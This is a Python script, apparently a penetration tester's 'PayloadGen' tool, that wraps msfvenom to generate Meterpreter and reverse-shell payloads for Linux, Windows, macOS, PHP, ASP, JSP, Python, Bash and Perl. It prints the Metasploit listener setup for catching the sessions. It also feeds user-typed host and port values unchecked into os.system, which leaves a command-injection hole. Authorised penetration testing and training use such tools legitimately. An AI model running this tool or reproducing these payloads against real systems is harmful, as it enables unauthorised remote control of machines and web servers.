#!/usr/bin/python3
# Python3 based script [User python3 command to execute it].
# Metasploit needs to be installed already on the system ofc -.-'
# Enjoy and don't forget to follow me on Github & Twitter ;-)
# Tahar Amine ELHOUARI | Penetration Tester | www.taharamine.me
#################################################################
import os
# OS Module to execute the MSFVenom toolkit
#################################################################
print ("""
Welcome to the Metasploit Framework Payloads Generator
Made by Tahar Amine ELHOUARI | www.TaharAmine.me | MrTaharAmine
Find me on: Twitter/Facebook/LinkedIn & Github  @MrTaharAmine
""")
#################################################################
print("PayloadGen: MSFVenom Payloads Generator")
print("""
__________               .__                    .___________               
\______   \_____  ___.__.|  |   _________     __| _/  _____/  ____   ____  
 |     ___/\__  \<   |  ||  |  /  _ \__  \   / __ /   \  ____/ __ \ /    \ 
 |    |     / __ \\___  ||  |_(  <_> ) __ \_/ /_/ \    \_\  \  ___/|   |  \
 |____|    (____  / ____||____/\____(____  /\____ |\______  /\___  >___|  /
                \/\/                     \/      \/       \/     \/     \/ 
	""")
#################################################################
stdin = input("Command -> ")
#################################################################
if stdin == "linux":
	print("Linux Reverse TCP")
	lhost = input("Local Host: ")
	lport = input("Local Port: ")
	pwn = os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > MrTaharAmine.elf" %(lhost, lport))
	pwned = print("[+] DONE [+]")
elif stdin == "windows":
	print("Windows Reverse TCP")
	lhost = input("Local Host: ")
	lport = input("Local Port: ")
	pwn = os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > MrTaharAmine.exe" %(lhost, lport))
	pwned = print("[+] DONE [+]")
elif stdin == "macosx":
	print("MacOSx Reverse TCP")
	lhost = input("Local Host: ")
	lport = input("Local Port: ")
	pwn = os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f macho > MrTaharAmine.macho" %(lhost, lport))
	pwned = print("[+] DONE [+]")
#################################################################
elif stdin == "php":
	print("Web Shell: PHP Reverse TCP")
	lhost = input("Local Host: ")
	lport = input("Local Port: ")
	pwn = os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw > MrTaharAmine.php" %(lhost, lport))
	pwned = print("[+] DONE [+]")
elif stdin == "asp":
	print("Web Shell: ASP Reverse TCP")
	lhost = input("Local Host: ")
	lport = input("Local Port: ")
	pwn = os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f asp > MrTaharAmine.asp" %(lhost, lport))
	pwned = print("[+] DONE [+]")
elif stdin == "jsp":
	print("Web Shell: Java JSP Reverse TCP")
	lhost = input("Local Host: ")
	lport = input("Local Port: ")
	pwn = os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw > MrTaharAmine.jsp" %(lhost, lport))
	pwned = print("[+] DONE [+]")
#################################################################
elif stdin == "python":
	print("Scripting: Python Reverse TCP")
	lhost = input("Local Host: ")
	lport = input("Local Port: ")
	pwn = os.system("msfvenom -p cmd/unix/reverse_python LHOST=%s LPORT=%s -f raw > MrTaharAmine.py" %(lhost, lport))
	pwned = print("[+] DONE [+]")
elif stdin == "bash":
	print("Scripting: BASH Reverse TCP")
	lhost = input("Local Host: ")
	lport = input("Local Port: ")
	pwn = os.system("msfvenom -p cmd/unix/reverse_bash LHOST=%s LPORT=%s -f raw > MrTaharAmine.sh" %(lhost, lport))
	pwned = print("[+] DONE [+]")
elif stdin == "perl":
	print("Scripting: Perl Reverse TCP")
	lhost = input("Local Host: ")
	lport = input("Local Port: ")
	pwn = os.system("msfvenom -p cmd/unix/reverse_perl LHOST=%s LPORT=%s -f raw > MrTaharAmine.pl" %(lhost, lport))
	pwned = print("[+] DONE [+]")
#################################################################
elif stdin == "help":
	print("Help! I am here :-D")
	print("Use the command 'exploit' to understand how to Exploit")
	print("Use the command 'payloads' to see the available Payloads")
#################################################################
elif stdin == "exploit":
	print("Honestly I am not showing you here how to Exploit :-P")
	print("I will show you just how to set up the Listener <3")
	print("""
		##############################
		# use exploit/multi/handler  #
		##############################
		# set PAYLOAD <Payload Name> #
		# set LHOST <LHOST>          #
		# set LPORT <LPORT>          #
		# set ExitOnSession false    #
		##############################
		# exploit                    #
		##############################
		""")
elif stdin == "payloads":
	print("""
################################
# linux: Linux Reverse TCP     #
# windows: Windows Reverse TCP #
# macosx: MacOSx Reverse TCP   #
################################
# php: PHP Reverse TCP         #
# asp: ASP Reverse TCP         #
# jsp: Java JSP Reverse TCP    #
################################
# python: Python Reverse TCP   #
# bash: BASH Reverse TCP       #
# perl: Perl Reverse TCP       #
################################
		""")
else:
	print("[!] Command not Found [!]")
	print("[+] Use 'help' command [+]")
	print("[+] Run me again! [+]")
#################################################################